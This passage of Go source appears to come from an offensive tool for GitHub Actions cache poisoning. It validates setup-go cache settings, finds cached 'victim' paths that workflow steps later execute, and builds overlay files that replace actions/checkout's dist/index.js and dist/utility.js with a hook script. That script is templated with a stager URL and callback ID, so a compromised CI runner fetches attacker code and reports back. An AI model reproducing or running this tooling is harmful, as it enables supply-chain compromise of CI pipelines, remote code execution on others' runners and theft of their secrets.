	if strings.Contains(dependencyPath, "${{") {
		readiness = "setup-go cache dependency path uses unsupported expressions"
		return
	}

	versionSpec = strings.TrimSpace(withValue(step.With, "go-version"))
	versionFilePath = strings.TrimSpace(withValue(step.With, "go-version-file"))
	if strings.Contains(versionSpec, "${{") {
		readiness = "setup-go version uses unsupported expressions"
		versionSpec = ""
		return
	}
	if strings.Contains(versionFilePath, "${{") {
		readiness = "setup-go version file uses unsupported expressions"
		versionSpec = ""
		return
	}

	if versionSpec != "" {
		if !exactGoVersionPattern.MatchString(versionSpec) {
			readiness = "setup-go version must be pinned to an exact release"
			return
		}
		ready = true
		readiness = "ready"
		return
	}

	if versionFilePath == "" {
		readiness = "setup-go version is not statically known"
		return
	}

	if strings.TrimSpace(root) == "" {
		ready = true
		readiness = "ready"
		return
	}

	resolvedVersion, err := parseSetupGoVersionFile(root, versionFilePath)
	if err != nil {
		readiness = err.Error()
		return
	}
	if !exactGoVersionPattern.MatchString(resolvedVersion) {
		versionSpec = resolvedVersion
		readiness = "setup-go version file must resolve to an exact release"
		return
	}
	versionSpec = resolvedVersion
	ready = true
	readiness = "ready"
	return
}

func parseSetupGoVersionFile(root, versionFilePath string) (string, error) {
	resolvedPath := strings.TrimSpace(versionFilePath)
	if resolvedPath == "" {
		return "", fmt.Errorf("setup-go version file path is empty")
	}
	if !filepath.IsAbs(resolvedPath) {
		resolvedPath = filepath.Join(normalizeWorkspace(root), filepath.FromSlash(resolvedPath))
	}

	data, err := os.ReadFile(resolvedPath)
	if err != nil {
		return "", fmt.Errorf("setup-go version file %s could not be read", versionFilePath)
	}
	contents := string(data)

	base := filepath.Base(resolvedPath)
	if base == "go.mod" || base == "go.work" {
		if match := toolchainGoVersionPattern.FindStringSubmatch(contents); len(match) == 2 {
			return match[1], nil
		}
		if match := directiveGoVersionPattern.FindStringSubmatch(contents); len(match) == 2 {
			return match[1], nil
		}
		return "", fmt.Errorf("setup-go version file %s does not declare a Go version", versionFilePath)
	}
	if base == ".tool-versions" {
		if match := toolVersionsGoPattern.FindStringSubmatch(contents); len(match) == 2 {
			return strings.TrimSpace(match[1]), nil
		}
		return "", fmt.Errorf("setup-go version file %s does not declare golang", versionFilePath)
	}
	return strings.TrimSpace(contents), nil
}

func findExecutedCacheTarget(paths []string, steps poutinemodels.GithubActionsSteps) string {
	roots := literalCacheRoots(paths)
	if len(roots) == 0 {
		return ""
	}

	for _, step := range steps {
		run := strings.TrimSpace(step.Run)
		if run == "" {
			continue
		}
		for _, line := range strings.Split(run, "\n") {
			target := matchExecutedCacheTarget(strings.TrimSpace(line), roots)
			if target == "" {
				continue
			}
			if wd := strings.TrimSpace(step.WorkingDirectory); wd != "" && !path.IsAbs(target) {
				target = path.Join(filepath.ToSlash(wd), target)
			}
			return normalizeVictimPath(target)
		}
	}
	return ""
}

func literalCacheRoots(patterns []string) []string {
	seen := make(map[string]struct{})
	var roots []string
	for _, pattern := range patterns {
		root := strings.TrimSpace(filepath.ToSlash(pattern))
		root = strings.TrimPrefix(root, "./")
		root = strings.TrimSuffix(root, "/")
		if root == "" || strings.ContainsAny(root, "*?[]{}") {
			continue
		}
		if _, ok := seen[root]; ok {
			continue
		}
		seen[root] = struct{}{}
		roots = append(roots, root)
	}
	sort.Strings(roots)
	return roots
}

func matchExecutedCacheTarget(line string, roots []string) string {
	line = strings.TrimSpace(line)
	if line == "" {
		return ""
	}
	for _, root := range roots {
		targetPattern := `((?:\./)?` + regexp.QuoteMeta(root) + `(?:/[^\s"'` + "`" + `;|&()<>]+)?)`
		invocationPattern := regexp.MustCompile(`(?:^|&&|\|\||[;|])\s*(?:source|\.|bash|sh)\s+` + targetPattern)
		if match := invocationPattern.FindStringSubmatch(line); len(match) == 2 {
			return match[1]
		}
		directPattern := regexp.MustCompile(`(?:^|&&|\|\||[;|])\s*` + targetPattern)
		if match := directPattern.FindStringSubmatch(line); len(match) == 2 {
			return match[1]
		}
	}
	return ""
}

func normalizeVictimPath(value string) string {
	value = strings.TrimSpace(filepath.ToSlash(value))
	value = strings.TrimPrefix(value, "./")
	value = path.Clean("/" + value)
	return strings.TrimPrefix(value, "/")
}

func findMatchingFiles(root string, patterns []string) ([]string, error) {
	seen := make(map[string]struct{})
	err := filepath.WalkDir(root, func(current string, entry fs.DirEntry, walkErr error) error {
		if walkErr != nil {
			return walkErr
		}
		if entry.IsDir() {
			return nil
		}
		rel, err := filepath.Rel(root, current)
		if err != nil {
			return err
		}
		rel = filepath.ToSlash(rel)
		for _, pattern := range patterns {
			ok, err := matchCachePattern(rel, filepath.ToSlash(strings.TrimSpace(pattern)))
			if err != nil {
				return err
			}
			if ok {
				seen[rel] = struct{}{}
				break
			}
		}
		return nil
	})
	if err != nil {
		return nil, err
	}

	files := make([]string, 0, len(seen))
	for file := range seen {
		files = append(files, file)
	}
	sort.Strings(files)
	return files, nil
}

func runnerOS() string {
	if value := strings.TrimSpace(os.Getenv("RUNNER_OS")); value != "" {
		return value
	}
	switch runtime.GOOS {
	case "darwin":
		return "macOS"
	case "windows":
		return "Windows"
	default:
		return "Linux"
	}
}

func setupGoArch() string {
	switch strings.ToLower(strings.TrimSpace(os.Getenv("RUNNER_ARCH"))) {
	case "x64", "amd64":
		return "x64"
	case "arm64", "aarch64":
		return "arm64"
	case "x86", "386":
		return "x86"
	}
	switch runtime.GOARCH {
	case "amd64":
		return "x64"
	case "arm64":
		return "arm64"
	case "386":
		return "x86"
	default:
		return runtime.GOARCH
	}
}

func defaultGoModCacheDir() string {
	if gopath := strings.TrimSpace(os.Getenv("GOPATH")); gopath != "" {
		return filepath.Join(gopath, "pkg", "mod")
	}
	home, err := os.UserHomeDir()
	if err != nil {
		return ""
	}
	return filepath.Join(home, "go", "pkg", "mod")
}

func defaultGoBuildCacheDir() string {
	if value := strings.TrimSpace(os.Getenv("XDG_CACHE_HOME")); value != "" {
		return filepath.Join(value, "go-build")
	}
	home, err := os.UserHomeDir()
	if err != nil {
		return ""
	}
	switch runtime.GOOS {
	case "darwin":
		return filepath.Join(home, "Library", "Caches", "go-build")
	case "windows":
		if localAppData := strings.TrimSpace(os.Getenv("LocalAppData")); localAppData != "" {
			return filepath.Join(localAppData, "go-build")
		}
	}
	return filepath.Join(home, ".cache", "go-build")
}

func firstNonEmpty(values ...string) string {
	for _, value := range values {
		if strings.TrimSpace(value) != "" {
			return strings.TrimSpace(value)
		}
	}
	return ""
}

func matchCachePattern(rel, pattern string) (bool, error) {
	if pattern == "" {
		return false, nil
	}
	pattern = strings.TrimPrefix(pattern, "./")
	if !strings.Contains(pattern, "*") && !strings.Contains(pattern, "?") {
		return rel == pattern, nil
	}
	regex, err := globToRegexp(pattern)
	if err != nil {
		return false, err
	}
	return regex.MatchString(rel), nil
}

func globToRegexp(pattern string) (*regexp.Regexp, error) {
	var builder strings.Builder
	builder.WriteString("^")
	for i := 0; i < len(pattern); i++ {
		ch := pattern[i]
		switch ch {
		case '*':
			if i+1 < len(pattern) && pattern[i+1] == '*' {
				builder.WriteString(".*")
				i++
			} else {
				builder.WriteString(`[^/]*`)
			}
		case '?':
			builder.WriteString(`[^/]`)
		case '.', '+', '(', ')', '[', ']', '{', '}', '^', '$', '|', '\\':
			builder.WriteByte('\\')
			builder.WriteByte(ch)
		default:
			builder.WriteByte(ch)
		}
	}
	builder.WriteString("$")
	return regexp.Compile(builder.String())
}

func sha256File(filePath string) ([]byte, error) {
	file, err := os.Open(filePath)
	if err != nil {
		return nil, err
	}
	defer file.Close()

	hash := sha256.New()
	if _, err := io.Copy(hash, file); err != nil {
		return nil, err
	}
	return hash.Sum(nil), nil
}

func CandidateSummary(candidate VictimCandidate) string {
	label := candidate.ConsumerLabel
	if label == "" {
		label = candidate.ConsumerAction
	}
	if candidate.TriggerMode == "" {
		return label
	}
	return label + " · " + candidate.TriggerMode
}

func CandidateExecutionSummary(candidate VictimCandidate) string {
	plan := executionPlan(candidate)
	switch plan.Kind {
	case ExecutionKindDirectCache:
		if plan.TargetPath != "" {
			return "direct cache exec · " + plan.TargetPath
		}
		return "direct cache exec"
	case ExecutionKindCheckoutPost:
		checkouts := checkoutRefs(plan)
		if len(checkouts) == 0 {
			return "actions/checkout post"
		}
		return "actions/checkout post · " + strings.Join(checkouts, ", ")
	default:
		return ""
	}
}

func CandidateCacheSummary(candidate VictimCandidate) string {
	plan := cacheEntryPlan(candidate)
	if plan.Mode == "" {
		return ""
	}
	switch plan.Strategy {
	case StrategyActionsCache:
		if plan.KeyTemplate != "" {
			return plan.Mode + " · " + plan.KeyTemplate
		}
	case StrategySetupNode:
		if plan.PackageManager != "" {
			return plan.Mode + " · " + plan.PackageManager
		}
	case StrategySetupGo:
		if plan.VersionSpec != "" {
			return plan.Mode + " · go " + plan.VersionSpec
		}
		if plan.VersionFilePath != "" {
			return plan.Mode + " · " + plan.VersionFilePath
		}
	}
	return plan.Mode
}

func CheckoutUsesForCandidate(candidate VictimCandidate) []string {
	return checkoutUses(executionPlan(candidate))
}

func CandidateDisplayPath(candidate VictimCandidate) string {
	if candidate.JobName != "" {
		return fmt.Sprintf("%s (%s)", candidate.Workflow, candidate.JobName)
	}
	if candidate.Job != "" {
		return fmt.Sprintf("%s (%s)", candidate.Workflow, candidate.Job)
	}
	return candidate.Workflow
}

func checkoutRefs(plan ExecutionPlan) []string {
	seen := make(map[string]struct{})
	var refs []string
	for _, checkout := range plan.Checkouts {
		ref := strings.TrimSpace(checkout.Ref)
		if ref == "" {
			continue
		}
		if _, ok := seen[ref]; ok {
			continue
		}
		seen[ref] = struct{}{}
		refs = append(refs, ref)
	}
	sort.Strings(refs)
	return refs
}

func checkoutUses(plan ExecutionPlan) []string {
	seen := make(map[string]struct{})
	var uses []string
	for _, checkout := range plan.Checkouts {
		value := strings.TrimSpace(checkout.Uses)
		if value == "" {
			continue
		}
		if _, ok := seen[value]; ok {
			continue
		}
		seen[value] = struct{}{}
		uses = append(uses, value)
	}
	sort.Strings(uses)
	return uses
}

func overwritePathsAtRoot(root, stagerURL, callbackID string, refs []string) map[string]OverlayFile {
	files := make(map[string]OverlayFile)
	root = strings.TrimSpace(root)
	if root == "" {
		root = "/home/runner/work/_actions/actions/checkout"
	}
	for _, ref := range refs {
		base := path.Join(root, ref)
		files[path.Join(base, "dist", "index.js")] = OverlayFile{Content: []byte(buildCheckoutIndexJS(stagerURL, callbackID)), Mode: 0o644}
		files[path.Join(base, "dist", "utility.js")] = OverlayFile{Content: []byte(buildCheckoutIndexJS(stagerURL, callbackID)), Mode: 0o644}
	}
	return files
}

func OverwritePaths(stagerURL, callbackID string, refs []string) map[string]OverlayFile {
	return overwritePathsAtRoot("", stagerURL, callbackID, refs)
}

func normalizeCheckoutRefs(refs []string) []string {
	seen := make(map[string]struct{})
	for _, ref := range refs {
		ref = strings.TrimSpace(ref)
		if ref != "" {
			seen[ref] = struct{}{}
			if versionRefPattern.MatchString(ref) {
				for i := 1; i <= 6; i++ {
					seen[fmt.Sprintf("v%d", i)] = struct{}{}
				}
			}
		}
	}
	if len(seen) == 0 {
		seen["v4"] = struct{}{}
	}
	values := make([]string, 0, len(seen))
	for value := range seen {
		values = append(values, value)
	}
	sort.Strings(values)
	return values
}

func DiscoverCheckoutRefs(root string) []string {
	root = strings.TrimSpace(root)
	if root == "" {
		root = "/home/runner/work/_actions/actions/checkout"
	}
	entries, err := os.ReadDir(root)
	if err != nil {
		return []string{"v4"}
	}
	var refs []string
	for _, entry := range entries {
		if entry.IsDir() {
			refs = append(refs, entry.Name())
		}
	}
	return normalizeCheckoutRefs(refs)
}

func discoverCheckoutRefsIfPresent(root string) []string {
	root = strings.TrimSpace(root)
	if root == "" {
		root = "/home/runner/work/_actions/actions/checkout"
	}
	entries, err := os.ReadDir(root)
	if err != nil {
		return nil
	}
	seen := make(map[string]struct{})
	var refs []string
	for _, entry := range entries {
		if !entry.IsDir() {
			continue
		}
		ref := strings.TrimSpace(entry.Name())
		if ref == "" {
			continue
		}
		if _, ok := seen[ref]; ok {
			continue
		}
		seen[ref] = struct{}{}
		refs = append(refs, ref)
	}
	sort.Strings(refs)
	return refs
}

func mergeCheckoutRefs(groups ...[]string) []string {
	seen := make(map[string]struct{})
	var refs []string
	for _, group := range groups {
		for _, ref := range group {
			ref = strings.TrimSpace(ref)
			if ref == "" {
				continue
			}
			if _, ok := seen[ref]; ok {
				continue
			}
			seen[ref] = struct{}{}
			refs = append(refs, ref)
		}
	}
	sort.Strings(refs)
	return refs
}

var versionRefPattern = regexp.MustCompile(`^v\d+$`)

func buildCheckoutIndexJS(stagerURL, callbackID string) string {
	content := strings.ReplaceAll(actionsCheckoutHookJS, "__SMOKEDMEAT_STAGER_URL__", stagerURL)
	return strings.ReplaceAll(content, "__SMOKEDMEAT_CALLBACK_ID__", callbackID)
}
